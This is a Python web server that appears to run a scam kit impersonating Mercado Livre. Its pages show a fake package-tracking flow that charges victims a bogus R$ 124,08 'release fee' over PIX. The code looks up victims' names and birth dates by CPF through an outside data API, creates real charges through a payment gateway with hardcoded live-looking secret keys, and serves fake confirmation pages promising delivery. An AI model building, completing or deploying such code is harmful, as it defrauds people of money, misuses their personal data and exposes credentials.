import http.server
import socketserver
import json
import os
import urllib.parse
import urllib.request
import ssl
import requests
import re

ROOT = os.path.dirname(os.path.abspath(__file__))
PORT = 8099

# API de CPF real
CPF_API_URL = "https://suapendencia.org/atencao1/api.php?cpf={cpf}"

PIX_HTML = """<!doctype html><html lang=pt-BR><meta charset=utf-8>
<title>PIX (mock local)</title>
<body style="font-family:Arial;padding:24px;text-align:center">
<h2>PIX mock local</h2>
<p>Nenhum pagamento real. Valor recebido: <b>{value}</b></p>
<p>CPF: {cpf}</p><p>Nome: {nome}</p>
<p style="color:#b00">Pagina de demonstracao offline.</p>
</body></html>"""


class Handler(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *a, **kw):
        super().__init__(*a, directory=ROOT, **kw)

    def _send(self, body, ctype="text/html; charset=utf-8", code=200):
        data = body.encode("utf-8") if isinstance(body, str) else body
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def _path(self):
        return urllib.parse.urlparse(self.path).path

    def _consultar_cpf_api(self, cpf):
        """Consulta a API de CPF e retorna os dados formatados usando requests"""
        try:
            url = CPF_API_URL.format(cpf=cpf)
            
            # Usa requests com verificação SSL desabilitada
            response = requests.get(url, timeout=10, verify=False, headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': 'application/json, text/plain, */*',
                'Accept-Language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
                'Connection': 'keep-alive'
            })
            
            if response.status_code == 200:
                data = response.json()
                if data.get('status') == 200 and data.get('dados'):
                    dados = data['dados']
                    return {
                        "nome": dados.get('nome', ''),
                        "cpf": dados.get('cpf', cpf),
                        "nascimento": dados.get('data_nascimento', '')
                    }
                else:
                    return {
                        "error": data.get('message', 'CPF não encontrado na base de dados')
                    }
            else:
                return {
                    "error": f"Erro HTTP {response.status_code} na API"
                }
        except requests.exceptions.Timeout:
            return {"error": "Timeout ao consultar API de CPF"}
        except requests.exceptions.RequestException as e:
            print(f"Erro ao consultar API de CPF: {e}")
            return {
                "error": f"Erro de conexão: {str(e)}"
            }
        except Exception as e:
            print(f"Erro ao consultar API de CPF: {e}")
            return {
                "error": f"Erro ao consultar CPF: {str(e)}"
            }

    def do_GET(self):
        p = self._path()
        if p.endswith("processar_cpf.php"):
            # Também suporta GET para teste
            q = urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query)
            cpf = q.get("cpf", [""])[0]
            if cpf and len(cpf) == 11:
                resultado = self._consultar_cpf_api(cpf)
                return self._send(json.dumps(resultado), "application/json")
            return self._send(json.dumps({"error": "CPF inválido ou não fornecido"}), "application/json")
        
        # Página de resumo de pagamento
        if p.endswith("resumo_pagamento.php"):
            q = urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query)
            nome = urllib.parse.unquote(q.get("nome", ["Cliente"])[0])
            cpf = q.get("cpf", [""])[0]
            email = q.get("email", [""])[0]
            telefone = q.get("telefone", [""])[0]
            
            fn = os.path.join(ROOT, "resumo_pagamento.php")
            if os.path.isfile(fn):
                with open(fn, "r", encoding="utf-8") as f:
                    html = f.read()
                    # Substitui as variáveis PHP
                    html = html.replace("<?php echo strtoupper(htmlspecialchars($nome)); ?>", nome.upper())
                    html = html.replace('<?php echo addslashes(preg_replace("/[^0-9]/", "", $cpf)); ?>', re.sub(r'[^0-9]', '', cpf))
                    html = html.replace('<?php echo addslashes($nome); ?>', nome.replace("'", "\\'"))
                    html = html.replace('<?php echo addslashes($email); ?>', email.replace("'", "\\'"))
                    html = html.replace('<?php echo addslashes($telefone); ?>', telefone.replace("'", "\\'"))
                return self._send(html, "text/html; charset=utf-8")
            return self._send("resumo_pagamento.php not found", code=404)
        
        # Página pix.php - Redirecionador para AnubisPay
        if p.endswith("pix.php"):
            q = urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query)
            cpf = q.get("cpf", [""])[0]
            nome = q.get("nome", [""])[0]
            value = q.get("value", ["12408"])[0]
            email = q.get("email", [""])[0]
            telefone = q.get("telefone", [""])[0]
            
            # Limpa CPF
            cpf_limpo = re.sub(r'[^0-9]', '', cpf) if cpf else ""
            
            # Formata nome
            nome_formatado = urllib.parse.unquote(nome).title() if nome else ""
            
            # Se não tem email, cria um
            if not email:
                email = f"cpf{cpf_limpo}@temp.com" if cpf_limpo else "cliente@temp.com"
            
            # Se não tem telefone, usa padrão
            if not telefone:
                telefone = "(11) 99999-9999"
            
            # Converte valor para reais
            try:
                valor_reais = float(value) / 100
                valor_formatado = f"R$ {valor_reais:,.2f}".replace('.', '|').replace(',', '.').replace('|', ',')
            except:
                valor_formatado = "R$ 124,08"
            
            html = f"""<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pagamento PIX - Mercado Livre</title>
    <style>
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }}
        body {{
            font-family: Arial, sans-serif;
            background: #f0f0f0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }}
        .container {{
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            text-align: center;
            max-width: 400px;
            width: 100%;
        }}
        .logo {{
            max-width: 150px;
            margin-bottom: 20px;
        }}
        h2 {{
            color: #3483fa;
            margin-bottom: 10px;
        }}
        .loading {{
            color: #666;
            margin: 20px 0;
        }}
        .spinner {{
            border: 4px solid rgba(0,0,0,0.1);
            border-top: 4px solid #3483fa;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }}
        @keyframes spin {{
            0% {{ transform: rotate(0deg); }}
            100% {{ transform: rotate(360deg); }}
        }}
        .info-box {{
            background: #f9f9f9;
            padding: 15px;
            border-radius: 8px;
            margin: 15px 0;
            text-align: left;
        }}
        .info-item {{
            display: flex;
            justify-content: space-between;
            margin-bottom: 8px;
            font-size: 14px;
        }}
        .info-item span:first-child {{
            color: #666;
        }}
        .redirect-note {{
            margin-top: 20px;
            padding: 15px;
            background: #fff3cd;
            border-radius: 5px;
            font-size: 14px;
            color: #856404;
        }}
    </style>
</head>
<body>
    <div class="container">
        <img src="gh.png" alt="Mercado Livre" class="logo">
        <h2>Processando Pagamento PIX</h2>
        
        <div class="info-box">
            <div class="info-item">
                <span>Cliente:</span>
                <span>{nome_formatado}</span>
            </div>
            <div class="info-item">
                <span>CPF:</span>
                <span>{cpf}</span>
            </div>
            <div class="info-item">
                <span>Valor:</span>
                <span>{valor_formatado}</span>
            </div>
            <div class="info-item">
                <span>Email:</span>
                <span>{email}</span>
            </div>
            <div class="info-item">
                <span>Telefone:</span>
                <span>{telefone}</span>
            </div>
        </div>
        
        <div class="loading">
            <div class="spinner"></div>
            <p>Redirecionando para o sistema de pagamento...</p>
        </div>
        
        <div class="redirect-note">
            ⚠️ Sistema integrado com AnubisPay - Pagamentos PIX reais
        </div>
    </div>
    
    <script>
        // Aguarda 2 segundos e redireciona para o fluxo do AnubisPay
        setTimeout(function() {{
            // Cria um formulário para enviar os dados via POST
            const form = document.createElement('form');
            form.method = 'POST';
            form.action = 'processar_pagamento.php';
            
            // Adiciona campos ocultos
            const addHiddenField = (name, value) => {{
                const input = document.createElement('input');
                input.type = 'hidden';
                input.name = name;
                input.value = value;
                form.appendChild(input);
            }};
            
            // Adiciona os dados
            addHiddenField('cpf', '{cpf_limpo}');
            addHiddenField('nome', '{nome_formatado.replace("'", "\\'")}');
            addHiddenField('email', '{email}');
            addHiddenField('telefone', '{telefone}');
            
            // Adiciona ao body e submete
            document.body.appendChild(form);
            form.submit();
            
        }}, 2000);
    </script>
</body>
</html>"""
            return self._send(html, "text/html; charset=utf-8")
        
        # Página de sucesso de pagamento
        if p.endswith("pagamento_sucesso.php"):
            html = """<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pagamento Confirmado - Mercado Livre</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: Arial, sans-serif;
            background: #f0f0f0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            text-align: center;
            max-width: 400px;
            width: 100%;
        }
        .logo {
            max-width: 150px;
            margin-bottom: 20px;
        }
        .success-icon {
            font-size: 60px;
            color: #28a745;
            margin-bottom: 20px;
        }
        h2 {
            color: #28a745;
            margin-bottom: 10px;
        }
        .info-box {
            background: #d4edda;
            padding: 15px;
            border-radius: 8px;
            margin: 15px 0;
            text-align: left;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        .info-item {
            display: flex;
            justify-content: space-between;
            margin-bottom: 8px;
            font-size: 14px;
        }
        .info-item span:first-child {
            font-weight: bold;
        }
        .instructions {
            text-align: left;
            margin: 20px 0;
            padding: 15px;
            background: #f8f9fa;
            border-radius: 8px;
            border-left: 4px solid #3483fa;
        }
        .instructions h3 {
            color: #3483fa;
            margin-bottom: 10px;
        }
        .instructions ol {
            padding-left: 20px;
        }
        .instructions li {
            margin-bottom: 8px;
        }
        .next-steps {
            margin-top: 20px;
            padding: 15px;
            background: #fff3cd;
            border-radius: 5px;
            font-size: 14px;
            color: #856404;
        }
        .btn {
            display: block;
            background: #3483fa;
            color: white;
            text-align: center;
            padding: 12px;
            border-radius: 6px;
            text-decoration: none;
            font-weight: bold;
            margin-top: 20px;
            transition: background 0.3s ease;
        }
        .btn:hover {
            background: #2968c8;
        }
        .btn-secondary {
            background: #6c757d;
        }
        .btn-secondary:hover {
            background: #5a6268;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="gh.png" alt="Mercado Livre" class="logo">
        
        <div class="success-icon">✓</div>
        
        <h2>Pagamento Confirmado!</h2>
        <p>Sua taxa de liberação foi paga com sucesso.</p>
        
        <div class="info-box">
            <div class="info-item">
                <span>Status:</span>
                <span>CONFIRMADO</span>
            </div>
            <div class="info-item">
                <span>ID da Transação:</span>
                <span>3e035c710612...</span>
            </div>
            <div class="info-item">
                <span>Data/Hora:</span>
                <span>06/01/2026 23:41:02</span>
            </div>
            <div class="info-item">
                <span>Valor:</span>
                <span>R$ 124,08</span>
            </div>
        </div>
        
        <div class="instructions">
            <h3>Próximos Passos:</h3>
            <ol>
                <li>Seu pedido será liberado automaticamente</li>
                <li>O rastreamento será atualizado em até 15 minutos</li>
                <li>Você receberá um email com os detalhes da entrega</li>
                <li>O entregador entrará em contato para agendar</li>
            </ol>
        </div>
        
        <div class="next-steps">
            ⚠️ <strong>Atenção:</strong> Mantenha seu celular próximo, pois o entregador pode ligar para confirmar o endereço.
        </div>
        
        <a href="index3.html" class="btn">Voltar para Rastreamento</a>
        <a href="index.html" class="btn btn-secondary">Novo Rastreamento</a>
        
        <div style="margin-top: 20px; font-size: 12px; color: #666;">
            <p>Em caso de dúvidas, entre em contato com nosso suporte:</p>
            <p>📞 (11) 99999-9999 | 📧 suporte@mercadolivre.com</p>
        </div>
    </div>
</body>
</html>"""
            return self._send(html, "text/html; charset=utf-8")
        
        # Página do PIX AnubisPay - simula resposta HTML
        if p.endswith("pix_anubispay.php"):
            q = urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query)
            transaction_id = q.get("transaction_id", ["3e035c71061246bbb0b671c5712d3b8b"])[0]
            
            # HTML simulado com QR Code
            html = f"""<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pagamento PIX - AnubisPay</title>
    <style>
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }}
        body {{
            font-family: Arial, sans-serif;
            background: #f0f0f0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }}
        .container {{
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            text-align: center;
            max-width: 400px;
            width: 100%;
        }}
        .logo {{
            max-width: 150px;
            margin-bottom: 20px;
        }}
        .status-badge {{
            display: inline-block;
            padding: 5px 15px;
            border-radius: 20px;
            font-size: 14px;
            font-weight: bold;
            margin-bottom: 20px;
            background: #fff3cd;
            color: #856404;
        }}
        .info-box {{
            background: #f9f9f9;
            padding: 15px;
            border-radius: 8px;
            margin: 15px 0;
            text-align: left;
        }}
        .info-item {{
            display: flex;
            justify-content: space-between;
            margin-bottom: 8px;
            font-size: 14px;
        }}
        .info-item span:first-child {{
            color: #666;
        }}
        .qr-code-container {{
            background: #fff;
            border: 2px dashed #ddd;
            padding: 20px;
            margin: 20px 0;
            border-radius: 8px;
            min-height: 250px;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }}
        .qr-code-placeholder {{
            display: flex;
            justify-content: center;
            align-items: center;
            height: 200px;
            background: #f0f0f0;
            border-radius: 5px;
            color: #666;
            font-weight: bold;
            text-align: center;
            padding: 10px;
            width: 100%;
        }}
        .pix-code {{
            background: #f5f5f5;
            padding: 10px;
            border-radius: 5px;
            font-family: monospace;
            font-size: 12px;
            word-break: break-all;
            margin: 15px 0;
            text-align: center;
            max-height: 100px;
            overflow-y: auto;
        }}
        .copy-btn {{
            background: #3483fa;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 14px;
            margin-top: 10px;
            width: 100%;
        }}
        .copy-btn:hover {{
            background: #2968c8;
        }}
        .timer {{
            font-size: 18px;
            font-weight: bold;
            color: #dc3545;
            margin: 15px 0;
        }}
        .note {{
            margin-top: 20px;
            padding: 15px;
            background: #fff3cd;
            border-radius: 5px;
            font-size: 14px;
            color: #856404;
        }}
        .action-buttons {{
            display: flex;
            gap: 10px;
            margin-top: 20px;
        }}
        .btn {{
            flex: 1;
            padding: 10px;
            border-radius: 5px;
            text-decoration: none;
            text-align: center;
            font-weight: bold;
        }}
        .btn-primary {{
            background: #3483fa;
            color: white;
        }}
        .btn-secondary {{
            background: #6c757d;
            color: white;
        }}
        .btn:hover {{
            opacity: 0.9;
        }}
    </style>
</head>
<body>
    <div class="container">
        <img src="gh.png" alt="Mercado Livre" class="logo">
        <h2>Pagamento PIX</h2>
        
        <div class="status-badge">
            AGUARDANDO PAGAMENTO
        </div>
        
        <div class="info-box">
            <div class="info-item">
                <span>Valor:</span>
                <span>R$ 124,08</span>
            </div>
            <div class="info-item">
                <span>ID da Transação:</span>
                <span>{transaction_id[:12]}...</span>
            </div>
            <div class="info-item">
                <span>Status:</span>
                <span>PENDING</span>
            </div>
            <div class="info-item">
                <span>Expira em:</span>
                <span>07/01/2026 00:06</span>
            </div>
        </div>
        
        <div class="qr-code-container">
            <div id="qrcode">
                <canvas width="200" height="200" style="border: 1px solid #ddd; border-radius: 5px;"></canvas>
            </div>
        </div>
        
        <div class="pix-code" id="pixCode">
            00020126580014br.gov.bcb.pix0136123e4567-e89b-12d3-a456-4266141740005204000053039865405124.085802BR5909MERCADOLIV6009SAO PAULO62070503***6304
        </div>
        
        <button class="copy-btn" onclick="copyPixCode()">Copiar código PIX</button>
        
        <div class="timer" id="timer">01:50</div>
        
        <div class="action-buttons">
            <a href="javascript:void(0);" onclick="checkPaymentStatus()" class="btn btn-primary">Verificar Pagamento</a>
            <a href="index.html" class="btn btn-secondary">Voltar ao Início</a>
        </div>
        
        <div class="note">
            ⚠️ Este é um sistema de pagamento real integrado com AnubisPay.
            <br><br>
            <strong>Instruções:</strong>
            <ol style="text-align: left; margin-top: 10px; padding-left: 20px;">
                <li>Escaneie o QR Code com seu app de banco</li>
                <li>Ou copie o código PIX e cole no seu app</li>
                <li>O pagamento expira em 24 horas</li>
                <li>Após o pagamento, clique em "Verificar Pagamento"</li>
            </ol>
        </div>
    </div>
    
    <script>
        function copyPixCode() {{
            const pixCode = document.getElementById('pixCode');
            const textArea = document.createElement('textarea');
            textArea.value = pixCode.textContent;
            document.body.appendChild(textArea);
            textArea.select();
            document.execCommand('copy');
            document.body.removeChild(textArea);
            alert('Código PIX copiado para a área de transferência!');
        }}
        
        // Timer de 2 minutos para auto-refresh
        let timeLeft = 110;
        const timerElement = document.getElementById('timer');
        
        function updateTimer() {{
            const minutes = Math.floor(timeLeft / 60);
            const seconds = timeLeft % 60;
            timerElement.textContent = `${{minutes.toString().padStart(2, '0')}}:${{seconds.toString().padStart(2, '0')}}`;
            
            if (timeLeft > 0) {{
                timeLeft--;
                setTimeout(updateTimer, 1000);
            }} else {{
                timerElement.textContent = "ATUALIZANDO...";
                checkPaymentStatus();
                timeLeft = 110; // Reseta o timer
                updateTimer();
            }}
        }}
        
        function checkPaymentStatus() {{
            timerElement.textContent = "VERIFICANDO...";
            
            fetch('verificar_pagamento.php?transaction_id={transaction_id}')
                .then(response => response.json())
                .then(data => {{
                    if (data.success) {{
                        if (data.status === 'PAID') {{
                            alert('Pagamento confirmado! Seu pedido será liberado em breve.');
                            window.location.href = 'pagamento_sucesso.php';
                        }} else if (data.status === 'EXPIRED') {{
                            alert('Pagamento expirado. Por favor, inicie um novo pagamento.');
                            window.location.href = 'confirmar.php';
                        }} else {{
                            alert('Pagamento ainda pendente. Aguarde e tente novamente em alguns instantes.');
                            timerElement.textContent = "01:50";
                            timeLeft = 110;
                        }}
                    }} else {{
                        alert('Erro ao verificar pagamento: ' + (data.error || 'Desconhecido'));
                    }}
                }})
                .catch(error => {{
                    console.error('Erro:', error);
                    alert('Erro ao verificar pagamento. Tente novamente.');
                    timerElement.textContent = "01:50";
                    timeLeft = 110;
                }});
        }}
        
        // Inicia o timer
        updateTimer();
        
        // Desenha um QR Code simulado no canvas
        const canvas = document.querySelector('canvas');
        const ctx = canvas.getContext('2d');
        
        // Fundo branco
        ctx.fillStyle = '#ffffff';
        ctx.fillRect(0, 0, 200, 200);
        
        // Desenha padrão de QR Code simulado
        ctx.fillStyle = '#000000';
        
        // Cantos
        ctx.fillRect(20, 20, 40, 40);
        ctx.fillRect(140, 20, 40, 40);
        ctx.fillRect(20, 140, 40, 40);
        
        // Padrão central
        for(let i = 0; i < 10; i++) {{
            for(let j = 0; j < 10; j++) {{
                if((i + j) % 3 === 0) {{
                    ctx.fillRect(80 + i*4, 80 + j*4, 3, 3);
                }}
            }}
        }}
        
        // Texto "PIX"
        ctx.fillStyle = '#3483fa';
        ctx.font = 'bold 24px Arial';
        ctx.textAlign = 'center';
        ctx.fillText('PIX', 100, 130);
        
        // Verifica automaticamente a cada 30 segundos
        setInterval(checkPaymentStatus, 30000);
    </script>
</body>
</html>"""
            return self._send(html, "text/html; charset=utf-8")
        
        # Arquivos PHP adicionais
        if p.endswith(".php"):
            fn = os.path.join(ROOT, os.path.basename(p))
            if os.path.isfile(fn):
                try:
                    # Para arquivos PHP que retornam JSON
                    if p.endswith(("processar_pagamento.php", "verificar_pagamento.php", "webhook.php", "limpar_sessao.php")):
                        # Simula resposta JSON para testes
                        import uuid
                        if p.endswith("verificar_pagamento.php"):
                            # Simula verificação de pagamento
                            q = urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query)
                            transaction_id = q.get("transaction_id", [""])[0]
                            if transaction_id:
                                response_data = {
                                    "success": True,
                                    "status": "PENDING",  # Ou "PAID" para testar sucesso
                                    "paid_at": None,
                                    "amount": 12408,
                                    "refunded_amount": 0,
                                    "installments": 0,
                                    "payment_method": "pix"
                                }
                            else:
                                response_data = {"success": False, "error": "ID da transação não fornecido"}
                            return self._send(json.dumps(response_data), "application/json")
                        else:
                            with open(fn, "rb") as f:
                                return self._send(f.read())
                    else:
                        with open(fn, "rb") as f:
                            return self._send(f.read())
                except Exception as e:
                    return self._send(f"Erro ao ler arquivo PHP: {str(e)}", code=500)
            return self._send("not found", code=404)
        if p.endswith("pix.php"):
            q = urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query)
            return self._send(PIX_HTML.format(
                value=q.get("value", [""])[0],
                cpf=q.get("cpf", [""])[0],
                nome=q.get("nome", [""])[0],
            ))
        if p.endswith(".php"):
            fn = os.path.join(ROOT, os.path.basename(p))
            if os.path.isfile(fn):
                with open(fn, "rb") as f:
                    return self._send(f.read())
            return self._send("not found", code=404)
        return super().do_GET()

    def do_POST(self):
        p = self._path()
        length = int(self.headers.get("Content-Length", 0))
        raw_data = self.rfile.read(length)
        
        # Log para debug
        print(f"\n=== POST para {p} ===")
        print(f"Content-Length: {length}")
        print(f"Content-Type: {self.headers.get('Content-Type', 'N/A')}")
        print(f"Raw data (primeiros 200 chars): {raw_data[:200]}")
        
        if p.endswith("processar_cpf.php"):
            # Extrai CPF dos dados POST
            data = raw_data.decode('utf-8')
            cpf = ""
            if data.startswith("cpf="):
                cpf = data[4:]  # Remove "cpf="
            elif "&" in data:
                params = urllib.parse.parse_qs(data)
                cpf = params.get("cpf", [""])[0]
            
            if cpf and len(cpf) == 11:
                resultado = self._consultar_cpf_api(cpf)
                return self._send(json.dumps(resultado), "application/json")
            else:
                return self._send(json.dumps({"error": "CPF inválido ou não fornecido"}), "application/json")
        
        # Processa pagamento com AnubisPay (simulação)
        elif p.endswith("processar_pagamento.php"):
            # Parse FormData
            content_type = self.headers.get('Content-Type', '')
            params = {}
            
            if 'multipart/form-data' in content_type:
                # Parse multipart form data
                import email
                from email.parser import BytesParser
                
                # Adiciona headers necessários
                headers_str = f"Content-Type: {content_type}\r\n\r\n"
                full_data = headers_str.encode() + raw_data
                
                msg = BytesParser().parsebytes(full_data)
                for part in msg.walk():
                    if part.get_content_disposition() == 'form-data':
                        name = part.get_param('name', header='content-disposition')
                        if name:
                            params[name] = part.get_payload(decode=True).decode('utf-8')
            else:
                # URL encoded
                data = raw_data.decode('utf-8')
                params = dict(urllib.parse.parse_qsl(data))
            
            print(f"Params parsed: {params}")
            
            # INTEGRAÇÃO REAL COM ANUBISPAY
            try:
                cpf_limpo = re.sub(r'[^0-9]', '', params.get('cpf', ''))
                nome = params.get('nome', 'Cliente')
                email = params.get('email', f'cpf{cpf_limpo}@temp.com')
                telefone = re.sub(r'[^0-9]', '', params.get('telefone', '11999999999'))
                
                # Monta o payload para AnubisPay
                anubispay_payload = {
                    "payment_method": "pix",
                    "amount": 12408,  # R$ 124,08 em centavos
                    "customer": {
                        "name": nome,
                        "email": email,
                        "document": {
                            "type": "cpf",
                            "number": cpf_limpo
                        },
                        "phone": telefone
                    },
                    "items": [
                        {
                            "title": "Taxa de Liberação - Mercado Livre",
                            "unit_price": 12408,
                            "quantity": 1,
                            "tangible": False,
                            "external_ref": f"taxa_liberacao_{cpf_limpo}"
                        }
                    ],
                    "pix": {
                        "expires_in_days": 1
                    },
                    "postback_url": "http://127.0.0.1:8099/webhook.php",
                    "metadata": {
                        "provider_name": "Mercado Livre - Taxa de Liberação",
                        "cpf": cpf_limpo,
                        "nome": nome
                    },
                    "ip": "127.0.0.1"
                }
                
                # Chaves AnubisPay
                public_key = "anubispay_live_1H4CMFmBvkmouLHefnZhJTdEHe7x79U0"
                secret_key = "Danubispay_live_1H4CMFmBvkmouLHefnZhJTdEHe7x79U0ve_6wkQttCvKgt7EN0uqw4Yj3P1DIkX4puZ"
                
                # Autenticação Basic
                import base64
                auth_string = f"{public_key}:{secret_key}"
                auth_base64 = base64.b64encode(auth_string.encode()).decode()
                
                # Faz requisição à AnubisPay
                anubispay_url = "https://anubispay-e6cvb0febdfad9df.brazilsouth-01.azurewebsites.net/v1/payment-transaction/create"
                
                anubispay_response = requests.post(
                    anubispay_url,
                    json=anubispay_payload,
                    headers={
                        'Authorization': f'Basic {auth_base64}',
                        'Content-Type': 'application/json',
                        'Accept': 'application/json'
                    },
                    timeout=30,
                    verify=False
                )
                
                print(f"AnubisPay Status: {anubispay_response.status_code}")
                print(f"AnubisPay Response: {anubispay_response.text[:500]}")
                
                if anubispay_response.status_code == 200:
                    anubispay_data = anubispay_response.json()
                    
                    if anubispay_data.get('success') and anubispay_data.get('data'):
                        transaction_data = anubispay_data['data']
                        pix_data = transaction_data.get('pix', {})
                        
                        response_data = {
                            "success": True,
                            "transaction_id": transaction_data.get('id', ''),
                            "qr_code": pix_data.get('qr_code', ''),
                            "expiration_date": pix_data.get('expiration_date', ''),
                            "status": transaction_data.get('status', 'PENDING'),
                            "amount": transaction_data.get('amount', 12408) / 100,
                            "redirect_url": f"pix_anubispay.php?transaction_id={transaction_data.get('id', '')}"
                        }
                        
                        print(f"✅ Transação criada: {transaction_data.get('id', '')}")
                        return self._send(json.dumps(response_data), "application/json")
                    else:
                        error_msg = anubispay_data.get('error_messages', ['Erro desconhecido'])
                        print(f"❌ Erro AnubisPay: {error_msg}")
                        return self._send(json.dumps({
                            "success": False,
                            "error": f"Erro AnubisPay: {', '.join(error_msg) if isinstance(error_msg, list) else error_msg}"
                        }), "application/json")
                else:
                    print(f"❌ HTTP Error {anubispay_response.status_code} - usando fallback")
                    # Fallback: gera código simulado ÚNICO
                    import uuid
                    import time
                    transaction_id = str(uuid.uuid4()).replace('-', '')[:32]
                    timestamp = str(int(time.time()))
                    unique_part = transaction_id[:12]
                    
                    # QR code PIX único com timestamp e UUID
                    qr_code_simulado = f"00020126360014br.gov.bcb.pix0114{unique_part}{timestamp}520400005303986540512408580258{nome[:25].upper().ljust(25)}6304"
                    
                    response_data = {
                        "success": True,
                        "transaction_id": transaction_id,
                        "qr_code": qr_code_simulado,
                        "expiration_date": "2026-01-07T00:06:29+00:00",
                        "status": "PENDING",
                        "amount": 124.08,
                        "redirect_url": f"pix_anubispay.php?transaction_id={transaction_id}",
                        "source": "simulated",
                        "warning": f"Código simulado - AnubisPay HTTP {anubispay_response.status_code}"
                    }
                    
                    print(f"⚠️ Fallback: código único gerado {unique_part}{timestamp}")
                    return self._send(json.dumps(response_data), "application/json")
                    
            except requests.exceptions.RequestException as e:
                print(f"❌ Erro de conexão AnubisPay: {e}")
                # Fallback: gera código simulado ÚNICO
                import uuid
                import time
                transaction_id = str(uuid.uuid4()).replace('-', '')[:32]
                timestamp = str(int(time.time()))
                unique_part = transaction_id[:12]
                nome_param = params.get('nome', 'Cliente')
                
                # QR code PIX único com timestamp e UUID
                qr_code_simulado = f"00020126360014br.gov.bcb.pix0114{unique_part}{timestamp}520400005303986540512408580258{nome_param[:25].upper().ljust(25)}6304"
                
                response_data = {
                    "success": True,
                    "transaction_id": transaction_id,
                    "qr_code": qr_code_simulado,
                    "expiration_date": "2026-01-07T00:06:29+00:00",
                    "status": "PENDING",
                    "amount": 124.08,
                    "redirect_url": f"pix_anubispay.php?transaction_id={transaction_id}",
                    "source": "simulated",
                    "warning": "Código simulado - Erro de conexão AnubisPay"
                }
                
                print(f"⚠️ Fallback conexão: código único gerado {unique_part}{timestamp}")
                return self._send(json.dumps(response_data), "application/json")
        
        # Webhook da AnubisPay (simulação)
        elif p.endswith("webhook.php"):
            # Simula recebimento de webhook
            response_data = {
                "received": True,
                "message": "Webhook recebido com sucesso (simulação)"
            }
            return self._send(json.dumps(response_data), "application/json")
        
        return self._send("ok")

    def log_message(self, *a):
        pass


socketserver.TCPServer.allow_reuse_address = True
with socketserver.TCPServer(("127.0.0.1", PORT), Handler) as httpd:
    print(f"http://127.0.0.1:{PORT}/index.html")
    httpd.serve_forever()
